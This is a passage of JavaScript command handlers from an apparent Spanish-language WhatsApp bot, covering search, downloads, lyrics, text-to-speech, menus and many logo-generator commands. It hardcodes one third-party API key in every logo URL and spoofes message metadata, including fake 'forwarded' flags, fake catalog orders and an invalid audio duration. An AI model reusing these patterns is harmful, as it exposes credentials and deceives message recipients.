case 'google':
  if (!isRegister) return leoply(baby.only.usrReg)
  if (isBan) return leoply  (baby.only.benned)	
              let buscar = args.join(' ')
              if (!buscar) return reply('Que deseas buscar?')
              let search = await LeoGg({ query: buscar })
              let ggsm = ``
              for (let i of search) {
              ggsm += `
*Titulo :* ${i.title}
*Link :* ${i.link}
*Contenido :* ${i.snippet}
`
              }
              var babygg = ggsm.trim()
              reply(`*🔍Busqueda realizada por* ${yo} \n\n${babygg}`)
              addFilter(from)
              break  

case 'fb':
            if (!q) return reply('y el link?')
            if (!isUrl(args[0]) && !args[0].includes('facebook.com')) return reply(baby.Iv)
            reply(baby.wait)
            te = args.join(' ')
            fakestatus(baby.wait)
            Fb.getInfo(`${te}`)
            .then(G => {
            ten = `${G.download.sd}`
            tek = `${G.title}`
            sendMediaURL(from,ten,`*Title* : ${tek}\n\n*Link* : ${ten}`)
           .catch((error) => {
            reply('intentalo nuevamente'); 
            })})
            break 

      /*47853094*/                
//NOSE

case 'lirik':
case 'letra':
case 'letras':
  if (isBan) return leoply  (baby.only.benned)	
          if (args.length < 1) return reply('Escribe el nombre de la cancion')
          if (!isRegister) return leoply(baby.only.usrReg)
          leo.updatePresence(from, Presence.composing)
          if (!q) return reply('*Cual es el nombre de la cancion?*')
          try {
          anu = await getJson(`https://some-random-api.ml/lyrics?title=${q}`)
          lyrics = `El resultado de ${anu.title}:\n\n*Autor:* ${anu.author}\n\n____________________\n\n${anu.lyrics}\n\n🌬Link: ${anu.links.genius}`
          sendFileFromUrl(anu.thumbnail.genius, image, {quoted: choute, caption: lyrics, sendEphemeral: true})
          } catch {
          reply(baby.ferr)
          }
          addFilter(from)
          break


case 'tts':
case 'voz':
                if (args.length < 1) return leo.sendMessage(from, 'Y el codigo de idioma? escribe el comando *idiomas* para ver la lista', text, { quoted: choute })
                const gtts = require('./lib/gtts')(args[0])
                if (args.length < 2) return leo.sendMessage(from, 'Escribe el texto', text, {quoted: choute})
                dtt = body.slice(8)
                ranm = getRandom('.mp3')
                rano = getRandom('.ogg')
                dtt.length > 300
                ? reply('Mira, si no sabes usar esto... mejor no lo agas 😤')
                : gtts.save(ranm, dtt, function() {
                leo.updatePresence(from, Presence.recording)
                leo.sendMessage(from, fs.readFileSync(ranm), audio, {quoted: choute, mimetype: 'audio/mp4', duration: -999999999999999999, ptt:true, sendEphemeral: true, contextInfo: {"forwardingScore": 999, "isForwarded": true}})
                fs.unlinkSync(ranm)
                })
                addFilter(from)
                break


case 'meme':
                leo.updatePresence(from, Presence.composing)
                if (!isRegister) return leoply(baby.only.usrReg)            
                try {
                beh = await getJson(`https://meme-api.herokuapp.com/gimme/memesmexico`)
                pint = await getBuffer(`${beh.url}`)
                reply(baby.wait)
                leo.sendMessage(from, pint, image, {
                quoted: choute, caption: `${beh.title}`, contextInfo: {"forwardingScore": 9999, "isForwarded": true}
                })
                  
                } catch {
                  reply('Intentalo de nuevo mas tarde...')
                }
                  break
case 'contacto':
                argz = arg.split('|')
                if (!argz) return reply(`Uso ${prefix}contacto @tag o escribe el numero|nombre`)
                if (choute.message.extendedTextMessage != undefined){
                wa.sendKontak(from, mentionUser[0].split('@')[0], argz[1])
                } else {
                wa.sendKontak(from, argz[0], argz[1])}
                addFilter(from)
                break


case 'contar':
  if (!isRegister) return leoply(baby.only.usrReg)
  if (isBan) return leoply  (baby.only.benned)	
addFilter(from)
if (args.length == 0) return reply('0 caracteres!😀 NO HAY TEXTO PARA CONTAR!')
const count = body.slice(8).length
if (count === 1) {
reply(`El texto solo contine *${count}* caracter.`)
} else if (count > 1) {
reply(`Su texto contiene *${count}* caracteres.`)
}
break



//════════════════════════════════════════ MENU Y LISTAS ════════════════════════════════
case 'menu':
//case 'a':

                if (!isRegister) return leoply(baby.only.usrReg)
                if (isBan) return leoply  (baby.only.benned)	
                reply('Cargando Menu, Porfavor no hacer spam de mensaje')
               txtt =`${cmenu}`              
                sendButLocation(from, `${txtt}`, `Si no ves los botones, escribe ${prefix}botones, para que te aparezca la soluccion.\nCreador @${ownerNumber.split("@")[0]}`, fs.readFileSync("./media/imagen/absu.jpg"),
                buttons =[ {buttonId:`mlq`,buttonText:{displayText: 'Lista de Menus'},type:1},
                {buttonId:`sex`,buttonText:{displayText:'Como Tener Este Bot'},type:1},
                {buttonId:`nuevo`,buttonText:{displayText:'LO NUEVO DEL BOT'},type:1}],
                {contextInfo: { mentionedJid: [sender,ownerNumber]}})
                men = leo.prepareMessageFromContent(from, { buttonsMessages })
                leo.relayWAMessage(men)
                break  




  //𝐋𝐢𝐬𝐭𝐚 𝐝𝐞 𝐌𝐞𝐧𝐮𝐬´

  
                case 'menuofc':
                  case 'ofc':
                  case 'allmenu':
                  case 'menuall':
                
                                if (!isRegister) return leoply(baby.only.usrReg)  
                                txtt =`${allmenu}`
                  txtt =
                  `${allmenu}`
                  buttons1 = [{buttonId:`mamaguevo`,buttonText:{displayText: 'Creditos'},type:1},
                {buttonId:`IM4K`,buttonText:{displayText: 'Creador'},type:1},
                {buttonId:`IM4K`,buttonText:{displayText: 'Como ser un bot'},type:1}]
                    imageMsg = (await leo.prepareMessageMedia(fs.readFileSync(`./media/imagen/bot-baby.jpg`), 'imageMessage', {thumbnail: fs.readFileSync(`./media/imagen/fake.jpg`)})).imageMessage
                    buttonsMessage = {
                    contentText: `${txtt}`,
                    footerText: '© Creator 𝕿𝖍ٌ𝖊𝕮𝖍𝖔𝖚𝖙𝖊', imageMessage: imageMsg,
                    buttons: buttons1,
                    headerType: 4}
                    all = leo.prepareMessageFromContent(from, { buttonsMessage }, { quoted: choute, contextInfo: { mentionedJid: [sender,ownerNumber]} })
                    leo.relayWAMessage(all)
                              break
  
  case 'menugrupo':
                reply('Cargando menu, porfavor espera.\n\nNo hagas spam de comandos')
                leo.sendMessage(from, fs.readFileSync('./media/imagen/fakae.jpg'), image, {caption: `${grupos}`, quoted: chr, contextInfo: { mentionedJid: [sender,ownerNumber]}})
                break

  case 'menuadmin':
                reply('Cargando menu, porfavor espera.\n\nNo hagas spam de comandos')
                leo.sendMessage(from, fs.readFileSync('./media/imagen/fakae.jpg'), image, {caption: `${admin}`, quoted: chr, contextInfo: { mentionedJid: [sender,ownerNumber]}})
                break
  
  case 'menumedia':
                reply('Cargando menu, porfavor espera.\n\nNo hagas spam de comandos')
                leo.sendMessage(from, fs.readFileSync('./media/imagen/fakae.jpg'), image, {caption: `${multimedia}`, quoted: chr, contextInfo: { mentionedJid: [sender,ownerNumber]}})
                break
  
  case 'menuowner':
                reply('Cargando menu, porfavor espera.\n\nNo hagas spam de comandos')
                leo.sendMessage(from, fs.readFileSync('./media/imagen/fakae.jpg'), image, {caption: `${owener}`, quoted: chr, contextInfo: { mentionedJid: [sender,ownerNumber]}})
                break
  
  case 'menulogo':
                reply('Cargando menu, porfavor espera.\n\nNo hagas spam de comandos')
                leo.sendMessage(from, fs.readFileSync('./media/imagen/fakae.jpg'), image, {caption: `${logos}`, quoted: chr, contextInfo: { mentionedJid: [sender,ownerNumber]}})
                break
  case '+18':
  case 'menu18':
  case 'labiblia':

                leo.sendMessage(from,  fs.readFileSync('./media/imagen/M18.jpg'), image, {thumbnail:fs.readFileSync('./media/imagen/fake18.jpg'), quoted: choute, caption: `${texto}\n${m18}`, contextInfo: { mentionedJid: [sender, ownerNumber], "forwardingScore": 508, "isForwarded": true, "externalAdReply": 
                {"title": 'Open your mind 💫',       
                "body": 'descripción',  
                "thumbnail": fs.readFileSync('./media/imagen/d.jpg'),
                "sourceUrl": 'https://chat.whatsapp.com/KOmt1i9738c2zA1SnSLwn1'}}})
                break
  case 'entretenimiento':
                reply('Cargando menu, porfavor espera.\n\nNo hagas spam de comandos')
                leo.sendMessage(from, fs.readFileSync('./media/imagen/fakae.jpg'), image, {caption: `${entrete}`, quoted: chr, contextInfo: { mentionedJid: [sender,ownerNumber]}})
                break
  case 'extra':
    fansh = leo.prepareMessageFromContent(from,{ "orderMessage": { "itemCount": 0, "totalAmount1000" : '1000', "message": `${extra}\n\n\nCreador is 𝕿𝖍ٌ𝖊𝕮𝖍𝖔𝖚𝖙𝖊`, "footerText": "*𝕿𝖍ٌ𝖊𝕮𝖍𝖔𝖚𝖙𝖊*", "thumbnail": fs.readFileSync('./media/imagen/cosplay/25.jpg'), "surface": 'CATALOG', "orderTitle": 'Sexo'}}, {contextInfo: { mentionedJid: [sender]}, quoted:choute, })
    leo.relayWAMessage(fansh)
    break
  case 'creditos':
  txtt = `${agra}`
    buttons1 = [{buttonId:`grupo`,buttonText:{displayText: 'Grupo de WhatsApp'},type:1},]
    imageMsg = (await leo.prepareMessageMedia(fs.readFileSync(`./media/imagen/TikTok.jpg`), 'imageMessage', {thumbnail: fs.readFileSync(`./media/imagen/fake.jpg`)})).imageMessage
    buttonsMessage = {
    contentText: `${txtt}`,
    footerText: '© Creator 𝕿𝖍ٌ𝖊𝕮𝖍𝖔𝖚𝖙𝖊', imageMessage: imageMsg,
    buttons: buttons1,
    headerType: 4}
    prep = leo.prepareMessageFromContent(from, { buttonsMessage }, { quoted: chr })
    leo.relayWAMessage(prep)
    break

case 'solubotones':
case 'soluboton':
case 'botones':
leo.sendMessage(from, `*SOLUCCION NO TE APARECEN LOS BOTONES EN LOS BOT DE WHATSAPP* \nhttps://youtu.be/s5c6FTjmdPA `, MessageType.text, {quoted: choute, contextInfo: {"forwardingScore": 508, "isForwarded": true, "externalAdReply": 
    {"title": `Hola ${pushname} 👋🏻`, 
    "body": `𝕿𝖍𝖊 𝕮𝖍𝖔𝖚𝖙𝖊`, "mediaType": 2, 
    "thumbnail": fs.readFileSync(`media/imagen/multimedia.jpg`), 
    mediaUrl: "https://youtu.be/s5c6FTjmdPA"}}})
    break

case 'nuevo':
  fansh = leo.prepareMessageFromContent(from,{ "orderMessage": { "itemCount": 0, "totalAmount1000" : '1000', "message": `${nuevo}\n\n\nCreador is 𝕿𝖍ٌ𝖊𝕮𝖍𝖔𝖚𝖙𝖊`, "footerText": "*𝕿𝖍ٌ𝖊𝕮𝖍𝖔𝖚𝖙𝖊*", "thumbnail":  fs.readFileSync('./media/imagen/Faketumber.jpg'), "surface": 'CATALOG', "orderTitle": 'Sexo'}}, {contextInfo: { mentionedJid: [sender]}, quoted:choute, })
  leo.relayWAMessage(fansh)
  break
//════════════════════════════════════════ LOGOS ════════════════════════════════


  // -    -     -     - 𝐋𝐨𝐠𝐨𝐬 𝐁𝐲 𝕿𝖍ٌ𝖊𝕮𝖍𝖔𝖚𝖙𝖊 - - - -   
  /**/case 'neon':
    if (!isRegister) return leoply(baby.only.usrReg)
  
  if (!q) return reply('*Y el texto para crear el logo donde esta?*')
  reply(`Su logo de ${command} con el texto ${q}, sera creado a la brevedad`)		
  logo = `https://api.zeks.me/api/bneon?apikey=FRPuR2WbwVlAI7rKYh16ypU9oxs&text=${q}`
  sendFileFromUrl(logo, image, {quoted: choute, caption: '*🔥 𝐋𝐨𝐠𝐨𝐬 𝐁𝐲 𝕿𝖍ٌ𝖊𝕮𝖍𝖔𝖚𝖙𝖊 🔥*\n*CANAL DEL CREADOR:*\nhttps://www.youtube.com/channel/UC-HPutaDGeTPjrCId0bXQgg?sub_confirmation=1', sendEphemeral: true})
  break
    
  /**/case 'matrix':
    if (!isRegister) return leoply(baby.only.usrReg)
  
  if (!q) return reply('*Y el texto para crear el logo donde esta?*')
  reply(`Su logo de ${command} con el texto ${q}, sera creado a la brevedad`)		
  logo = `https://api.zeks.me/api/matrix?apikey=FRPuR2WbwVlAI7rKYh16ypU9oxs&text=${q}`
  sendFileFromUrl(logo, image, {quoted: choute, caption: '*🔥 𝐋𝐨𝐠𝐨𝐬 𝐁𝐲 𝕿𝖍ٌ𝖊𝕮𝖍𝖔𝖚𝖙𝖊 🔥*\n*CANAL DEL CREADOR:*\nhttps://www.youtube.com/channel/UC-HPutaDGeTPjrCId0bXQgg?sub_confirmation=1', sendEphemeral: true})
  break		

    
  case 'break':
    if (!isRegister) return leoply(baby.only.usrReg)
  
  if (!q) return reply('*Y el texto para crear el logo donde esta?*')
  reply(`Su logo de ${command} con el texto ${q}, sera creado a la brevedad`)		
  logo = `https://api.zeks.me/api/breakwall?apikey=FRPuR2WbwVlAI7rKYh16ypU9oxs&text=${q}`
  sendFileFromUrl(logo, image, {quoted: choute, caption: '*🔥 𝐋𝐨𝐠𝐨𝐬 𝐁𝐲 𝕿𝖍ٌ𝖊𝕮𝖍𝖔𝖚𝖙𝖊 🔥*\n*CANAL DEL CREADOR:*\nhttps://www.youtube.com/channel/UC-HPutaDGeTPjrCId0bXQgg?sub_confirmation=1', sendEphemeral: true})
  break		
    
  case 'dropwater':
    if (!isRegister) return leoply(baby.only.usrReg)
  
  if (!q) return reply('*Y el texto para crear el logo donde esta?*')
  reply(`Su logo de ${command} con el texto ${q}, sera creado a la brevedad`)		
  logo = `https://api.zeks.me/api/dropwater?apikey=FRPuR2WbwVlAI7rKYh16ypU9oxs&text=${q}`
  sendFileFromUrl(logo, image, {quoted: choute, caption: '*🔥 𝐋𝐨𝐠𝐨𝐬 𝐁𝐲 𝕿𝖍ٌ𝖊𝕮𝖍𝖔𝖚𝖙𝖊 🔥*\n*CANAL DEL CREADOR:*\nhttps://www.youtube.com/channel/UC-HPutaDGeTPjrCId0bXQgg?sub_confirmation=1', sendEphemeral: true})
  break	
    
  case 'lobo':
    if (!isRegister) return leoply(baby.only.usrReg)
  
  if (!q) return reply('*Y el texto para crear el logo donde esta?*')
  if (!q.includes('|')) return  reply(`*PORFAVOR ESCRIBE BIEN EL FORMATO:* ${prefix + command} *texto1|texto2*\n\n_Separa el texto 1 del texto 2 con el simbolo "|"_`)
  reply(`*Porfavor espera un momento, tu logo ${command} esta siendo creado con el texto ${texto1 + texto2}!*`)		
  logo = `https://api.zeks.me/api/wolflogo?apikey=FRPuR2WbwVlAI7rKYh16ypU9oxs&text1=${texto1}&text2=${texto2}`
  sendFileFromUrl(logo, image, {quoted: choute, caption: '*🔥 𝐋𝐨𝐠𝐨𝐬 𝐁𝐲 𝕿𝖍ٌ𝖊𝕮𝖍𝖔𝖚𝖙𝖊 🔥*\n*CANAL DEL CREADOR:*\nhttps://www.youtube.com/channel/UC-HPutaDGeTPjrCId0bXQgg?sub_confirmation=1', sendEphemeral: true})
  break
    
  case 'flores':
    if (!isRegister) return leoply(baby.only.usrReg)
  
  if (!q) return reply('*Y el texto para crear el logo donde esta?*')
  reply(`Su logo de ${command} con el texto ${q}, sera creado a la brevedad`)		
  logo = `https://api.zeks.me/api/flowertext?apikey=FRPuR2WbwVlAI7rKYh16ypU9oxs&text=${q}`
  sendFileFromUrl(logo, image, {quoted: choute, caption: '*🔥 𝐋𝐨𝐠𝐨𝐬 𝐁𝐲 𝕿𝖍ٌ𝖊𝕮𝖍𝖔𝖚𝖙𝖊 🔥*\n*CANAL DEL CREADOR:*\nhttps://www.youtube.com/channel/UC-HPutaDGeTPjrCId0bXQgg?sub_confirmation=1', sendEphemeral: true})
  break	
    
  case 'cross':
    if (!isRegister) return leoply(baby.only.usrReg)
  
  if (!q) return reply('*Y el texto para crear el logo donde esta?*')
  reply(`Su logo de ${command} con el texto ${q}, sera creado a la brevedad`)		
  logo = `https://api.zeks.me/api/crosslogo?apikey=FRPuR2WbwVlAI7rKYh16ypU9oxs&text=${q}`
  sendFileFromUrl(logo, image, {quoted: choute, caption: '*🔥 𝐋𝐨𝐠𝐨𝐬 𝐁𝐲 𝕿𝖍ٌ𝖊𝕮𝖍𝖔𝖚𝖙𝖊 🔥*\n*CANAL DEL CREADOR:*\nhttps://www.youtube.com/channel/UC-HPutaDGeTPjrCId0bXQgg?sub_confirmation=1', sendEphemeral: true})
  break
    
  case 'seda':
    if (!isRegister) return leoply(baby.only.usrReg)
  
  if (!q) return reply('*Y el texto para crear el logo donde esta?*')
  reply(`Su logo de ${command} con el texto ${q}, sera creado a la brevedad`)		
  logo = `https://api.zeks.me/api/silktext?apikey=FRPuR2WbwVlAI7rKYh16ypU9oxs&text=${q}`
  sendFileFromUrl(logo, image, {quoted: choute, caption: '*🔥 𝐋𝐨𝐠𝐨𝐬 𝐁𝐲 𝕿𝖍ٌ𝖊𝕮𝖍𝖔𝖚𝖙𝖊 🔥*\n*CANAL DEL CREADOR:*\nhttps://www.youtube.com/channel/UC-HPutaDGeTPjrCId0bXQgg?sub_confirmation=1', sendEphemeral: true})
  break
    
  case 'fire':
    if (!isRegister) return leoply(baby.only.usrReg)
  
  if (!q) return reply('*Y el texto para crear el logo donde esta?*')
  reply(`Su logo de ${command} con el texto ${q}, sera creado a la brevedad`)		
  logo = `https://api.zeks.me/api/flametext?apikey=FRPuR2WbwVlAI7rKYh16ypU9oxs&text=${q}`
  sendFileFromUrl(logo, image, {quoted: choute, caption: '*🔥 𝐋𝐨𝐠𝐨𝐬 𝐁𝐲 𝕿𝖍ٌ𝖊𝕮𝖍𝖔𝖚𝖙𝖊 🔥*\n*CANAL DEL CREADOR:*\nhttps://www.youtube.com/channel/UC-HPutaDGeTPjrCId0bXQgg?sub_confirmation=1', sendEphemeral: true})
  break
    
  case 'glow':
    if (!isRegister) return leoply(baby.only.usrReg)
  
  if (!q) return reply('*Y el texto para crear el logo donde esta?*')
  reply(`Su logo de ${command} con el texto ${q}, sera creado a la brevedad`)		
  logo = `https://api.zeks.me/api/glowtext?apikey=FRPuR2WbwVlAI7rKYh16ypU9oxs&text=${q}`
  sendFileFromUrl(logo, image, {quoted: choute, caption: '*🔥 𝐋𝐨𝐠𝐨𝐬 𝐁𝐲 𝕿𝖍ٌ𝖊𝕮𝖍𝖔𝖚𝖙𝖊 🔥*\n*CANAL DEL CREADOR:*\nhttps://www.youtube.com/channel/UC-HPutaDGeTPjrCId0bXQgg?sub_confirmation=1', sendEphemeral: true})
  break
    
  case 'smoke':
    if (!isRegister) return leoply(baby.only.usrReg)
  
  if (!q) return reply('*Y el texto para crear el logo donde esta?*')
  reply(`Su logo de ${command} con el texto ${q}, sera creado a la brevedad`)		
  logo = `https://api.zeks.me/api/smoketext?apikey=FRPuR2WbwVlAI7rKYh16ypU9oxs&text=${q}`
  sendFileFromUrl(logo, image, {quoted: choute, caption: '*🔥 𝐋𝐨𝐠𝐨𝐬 𝐁𝐲 𝕿𝖍ٌ𝖊𝕮𝖍𝖔𝖚𝖙𝖊 🔥*\n*CANAL DEL CREADOR:*\nhttps://www.youtube.com/channel/UC-HPutaDGeTPjrCId0bXQgg?sub_confirmation=1', sendEphemeral: true})
  break	
    
  case 'pubg':
    if (!isRegister) return leoply(baby.only.usrReg)
  
  if (!q) return reply('*Y el texto para crear el logo donde esta?*')
  if (!q.includes('|')) return  reply(`*PORFAVOR ESCRIBE BIEN EL FORMATO:* ${prefix + command} *texto1|texto2*\n\n_Separa el texto 1 del texto 2 con el simbolo "|"_`)
  reply(`*Porfavor espera un momento, tu logo ${command} esta siendo creado con el texto ${texto1 + texto2}!*`)		
  logo = `https://api.zeks.me/api/pubglogo?apikey=FRPuR2WbwVlAI7rKYh16ypU9oxs&text1=${texto1}&text2=${texto2}`
  sendFileFromUrl(logo, image, {quoted: choute, caption: '*🔥 𝐋𝐨𝐠𝐨𝐬 𝐁𝐲 𝕿𝖍ٌ𝖊𝕮𝖍𝖔𝖚𝖙𝖊 🔥*\n*CANAL DEL CREADOR:*\nhttps://www.youtube.com/channel/UC-HPutaDGeTPjrCId0bXQgg?sub_confirmation=1', sendEphemeral: true})
  break
    
  case 'cielo':
    if (!isRegister) return leoply(baby.only.usrReg)
  
  if (!q) return reply('*Y el texto para crear el logo donde esta?*')
  reply(`Su logo de ${command} con el texto ${q}, sera creado a la brevedad`)		
  logo = `https://api.zeks.me/api/skytext?apikey=FRPuR2WbwVlAI7rKYh16ypU9oxs&text=${q}`
  sendFileFromUrl(logo, image, {quoted: choute, caption: '*🔥 𝐋𝐨𝐠𝐨𝐬 𝐁𝐲 𝕿𝖍ٌ𝖊𝕮𝖍𝖔𝖚𝖙𝖊 🔥*\n*CANAL DEL CREADOR:*\nhttps://www.youtube.com/channel/UC-HPutaDGeTPjrCId0bXQgg?sub_confirmation=1', sendEphemeral: true})
  break
  
  case 'cs':
    if (!isRegister) return leoply(baby.only.usrReg)
  
  if (!q) return reply('*Y el texto para crear el logo donde esta?*')
  reply(`Su logo de ${command} con el texto ${q}, sera creado a la brevedad`)		
  logo = `https://api.zeks.me/api/cslogo?apikey=FRPuR2WbwVlAI7rKYh16ypU9oxs&text=${q}`
  sendFileFromUrl(logo, image, {quoted: choute, caption: '*🔥 𝐋𝐨𝐠𝐨𝐬 𝐁𝐲 𝕿𝖍ٌ𝖊𝕮𝖍𝖔𝖚𝖙𝖊 🔥*\n*CANAL DEL CREADOR:*\nhttps://www.youtube.com/channel/UC-HPutaDGeTPjrCId0bXQgg?sub_confirmation=1', sendEphemeral: true})
  break	
    
  case 'ligth':
    if (!isRegister) return leoply(baby.only.usrReg)
  
  if (!q) return reply('*Y el texto para crear el logo donde esta?*')
  reply(`Su logo de ${command} con el texto ${q}, sera creado a la brevedad`)		
  logo = `https://api.zeks.me/api/lithgtext?apikey=FRPuR2WbwVlAI7rKYh16ypU9oxs&text=${q}`
  sendFileFromUrl(logo, image, {quoted: choute, caption: '*🔥 𝐋𝐨𝐠𝐨𝐬 𝐁𝐲 𝕿𝖍ٌ𝖊𝕮𝖍𝖔𝖚𝖙𝖊 🔥*\n*CANAL DEL CREADOR:*\nhttps://www.youtube.com/channel/UC-HPutaDGeTPjrCId0bXQgg?sub_confirmation=1', sendEphemeral: true})
  break	
    
  case 'navidad':
    if (!isRegister) return leoply(baby.only.usrReg)
  if (!q) return reply('*Y el texto para crear el logo donde esta?*')
  reply(`Su logo de ${command} con el texto ${q}, sera creado a la brevedad`)		
  logo = `https://api.zeks.me/api/crismes?apikey=FRPuR2WbwVlAI7rKYh16ypU9oxs&text=${q}`
  sendFileFromUrl(logo, image, {quoted: choute, caption: '*🔥 𝐋𝐨𝐠𝐨𝐬 𝐁𝐲 𝕿𝖍ٌ𝖊𝕮𝖍𝖔𝖚𝖙𝖊 🔥*\n*CANAL DEL CREADOR:*\nhttps://www.youtube.com/channel/UC-HPutaDGeTPjrCId0bXQgg?sub_confirmation=1', sendEphemeral: true})
  break
    
  case 'nieve':
    if (!isRegister) return leoply(baby.only.usrReg)
  if (!q) return reply('*Y el texto para crear el logo donde esta?*')
  reply(`Su logo de ${command} con el texto ${q}, sera creado a la brevedad`)		
  logo = `https://api.zeks.me/api/snowwrite?apikey=FRPuR2WbwVlAI7rKYh16ypU9oxs&text1=${q}`
  sendFileFromUrl(logo, image, {quoted: choute, caption: '*🔥 𝐋𝐨𝐠𝐨𝐬 𝐁𝐲 𝕿𝖍ٌ𝖊𝕮𝖍𝖔𝖚𝖙𝖊 🔥*\n*CANAL DEL CREADOR:*\nhttps://www.youtube.com/channel/UC-HPutaDGeTPjrCId0bXQgg?sub_confirmation=1', sendEphemeral: true})
  break
    
  case 'tfire':
    if (!isRegister) return leoply(baby.only.usrReg)
  if (!q) return reply('*Y el texto para crear el logo donde esta?*')
  reply(`Su logo de ${command} con el texto ${q}, sera creado a la brevedad`)		
  logo = `https://api.zeks.me/api/tfire?apikey=FRPuR2WbwVlAI7rKYh16ypU9oxs&text=${q}`
  sendFileFromUrl(logo, image, {quoted: choute, caption: '*🔥 𝐋𝐨𝐠𝐨𝐬 𝐁𝐲 𝕿𝖍ٌ𝖊𝕮𝖍𝖔𝖚𝖙𝖊 🔥*\n*CANAL DEL CREADOR:*\nhttps://www.youtube.com/channel/UC-HPutaDGeTPjrCId0bXQgg?sub_confirmation=1', sendEphemeral: true})
  break	
    
  case 'playa':
    if (!isRegister) return leoply(baby.only.usrReg)
  if (!q) return reply('*Y el texto para crear el logo donde esta?*')
  reply(`Su logo de ${command} con el texto ${q}, sera creado a la brevedad`)		
  logo = `https://api.zeks.me/api/sandw?apikey=FRPuR2WbwVlAI7rKYh16ypU9oxs&text=${q}`
  sendFileFromUrl(logo, image, {quoted: choute, caption: '*🔥 𝐋𝐨𝐠𝐨𝐬 𝐁𝐲 𝕿𝖍ٌ𝖊𝕮𝖍𝖔𝖚𝖙𝖊 🔥*\n*CANAL DEL CREADOR:*\nhttps://www.youtube.com/channel/UC-HPutaDGeTPjrCId0bXQgg?sub_confirmation=1', sendEphemeral: true})
  break
    
  case 'ff':
    if (!isRegister) return leoply(baby.only.usrReg)
  if (!q) return reply('*Y el texto para crear el logo donde esta?*')
  reply(`Su logo de ${command} con el texto ${q}, sera creado a la brevedad`)		
  logo = `https://api.zeks.me/api/epep?apikey=FRPuR2WbwVlAI7rKYh16ypU9oxs&text=${q}`
  sendFileFromUrl(logo, image, {quoted: choute, caption: '*🔥 𝐋𝐨𝐠𝐨𝐬 𝐁𝐲 𝕿𝖍ٌ𝖊𝕮𝖍𝖔𝖚𝖙𝖊 🔥*\n*CANAL DEL CREADOR:*\nhttps://www.youtube.com/channel/UC-HPutaDGeTPjrCId0bXQgg?sub_confirmation=1', sendEphemeral: true})
  break
    
  case 'goldbutton':
    if (!isRegister) return leoply(baby.only.usrReg)
  if (!q) return reply('*Y el texto para crear el logo donde esta?*')
  reply(`Su logo de ${command} con el texto ${q}, sera creado a la brevedad`)		
  logo = `https://api.zeks.me/api/gplaybutton?apikey=FRPuR2WbwVlAI7rKYh16ypU9oxs&text=${q}`
  sendFileFromUrl(logo, image, {quoted: choute, caption: '*🔥 𝐋𝐨𝐠𝐨𝐬 𝐁𝐲 𝕿𝖍ٌ𝖊𝕮𝖍𝖔𝖚𝖙𝖊 🔥*\n*CANAL DEL CREADOR:*\nhttps://www.youtube.com/channel/UC-HPutaDGeTPjrCId0bXQgg?sub_confirmation=1', sendEphemeral: true})
  break		
  
  case 'silverbutton':
    if (!isRegister) return leoply(baby.only.usrReg)
  if (!q) return reply('*Y el texto para crear el logo donde esta?*')
  reply(`Su logo de ${command} con el texto ${q}, sera creado a la brevedad`)		
  logo = `https://api.zeks.me/api/splaybutton?apikey=FRPuR2WbwVlAI7rKYh16ypU9oxs&text=${q}`
  sendFileFromUrl(logo, image, {quoted: choute, caption: '*🔥 𝐋𝐨𝐠𝐨𝐬 𝐁𝐲 𝕿𝖍ٌ𝖊𝕮𝖍𝖔𝖚𝖙𝖊 🔥*\n*CANAL DEL CREADOR:*\nhttps://www.youtube.com/channel/UC-HPutaDGeTPjrCId0bXQgg?sub_confirmation=1', sendEphemeral: true})
  break	
    
  case '3d':
    if (!isRegister) return leoply(baby.only.usrReg)
  
  if (!q) return reply('*Y el texto para crear el logo donde esta?*')
  reply(`Su logo de ${command} con el texto ${q}, sera creado a la brevedad`)		
  logo = `https://api.zeks.me/api/text3dbox?apikey=FRPuR2WbwVlAI7rKYh16ypU9oxs&text=${q}`
  sendFileFromUrl(logo, image, {quoted: choute, caption: '*🔥 𝐋𝐨𝐠𝐨𝐬 𝐁𝐲 𝕿𝖍ٌ𝖊𝕮𝖍𝖔𝖚𝖙𝖊 🔥*\n*CANAL DEL CREADOR:*\nhttps://www.youtube.com/channel/UC-HPutaDGeTPjrCId0bXQgg?sub_confirmation=1', sendEphemeral: true})
  break		
    
  case 'avengers':
    if (!isRegister) return leoply(baby.only.usrReg)
  if (!q) return reply('*Y el texto para crear el logo donde esta?*')
  if (!q.includes('|')) return  reply(`*PORFAVOR ESCRIBE BIEN EL FORMATO:* ${prefix + command} *texto1|texto2*\n\n_Separa el texto 1 del texto 2 con el simbolo "|"_`)
  reply(`*Porfavor espera un momento, tu logo ${command} esta siendo creado con el texto ${texto1 + texto2}!*`)		
  logo = `https://api.zeks.me/api/logoaveng?apikey=FRPuR2WbwVlAI7rKYh16ypU9oxs&text1=${texto1}&text2=${texto2}`
  sendFileFromUrl(logo, image, {quoted: choute, caption: '*🔥 𝐋𝐨𝐠𝐨𝐬 𝐁𝐲 𝕿𝖍ٌ𝖊𝕮𝖍𝖔𝖚𝖙𝖊 🔥*\n*CANAL DEL CREADOR:*\nhttps://www.youtube.com/channel/UC-HPutaDGeTPjrCId0bXQgg?sub_confirmation=1', sendEphemeral: true})
  break	
    
  case '3d2':
    if (!isRegister) return leoply(baby.only.usrReg)
  if (!q) return reply('*Y el texto para crear el logo donde esta?*')
  reply(`Su logo de ${command} con el texto ${q}, sera creado a la brevedad`)		
  logo = `https://api.zeks.me/api/text3d?apikey=FRPuR2WbwVlAI7rKYh16ypU9oxs&text=${q}`
  sendFileFromUrl(logo, image, {quoted: choute, caption: '*🔥 𝐋𝐨𝐠𝐨𝐬 𝐁𝐲 𝕿𝖍ٌ𝖊𝕮𝖍𝖔𝖚𝖙𝖊 🔥*\n*CANAL DEL CREADOR:*\nhttps://www.youtube.com/channel/UC-HPutaDGeTPjrCId0bXQgg?sub_confirmation=1', sendEphemeral: true})
  break	
    
  case 'ph':
    if (!isRegister) return leoply(baby.only.usrReg)
  if (!q) return reply('*Y el texto para crear el logo donde esta?*')
  if (!q.includes('|')) return  reply(`*PORFAVOR ESCRIBE BIEN EL FORMATO:* ${prefix + command} *texto1|texto2*\n\n_Separa el texto 1 del texto 2 con el simbolo "|"_`)
  reply(`*Porfavor espera un momento, tu logo ${command} esta siendo creado con el texto ${texto1 + texto2}!*`)		
  logo = `https://api.zeks.me/api/phlogo?apikey=FRPuR2WbwVlAI7rKYh16ypU9oxs&text1=${texto1}&text2=${texto2}`
  sendFileFromUrl(logo, image, {quoted: choute, caption: '*🔥 𝐋𝐨𝐠𝐨𝐬 𝐁𝐲 𝕿𝖍ٌ𝖊𝕮𝖍𝖔𝖚𝖙𝖊 🔥*\n*CANAL DEL CREADOR:*\nhttps://www.youtube.com/channel/UC-HPutaDGeTPjrCId0bXQgg?sub_confirmation=1', sendEphemeral: true})
  break		
    
